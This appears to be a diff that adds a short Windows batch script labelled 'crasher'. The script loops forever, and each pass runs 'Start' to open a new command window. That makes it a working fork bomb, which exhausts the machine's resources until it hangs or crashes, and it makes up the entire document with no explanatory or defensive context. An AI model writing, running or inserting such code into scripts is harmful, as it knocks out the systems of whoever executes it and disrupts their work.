@@ -1,0 +1,5 @@
+: crasher      
+
+Start
+
+goto crasher
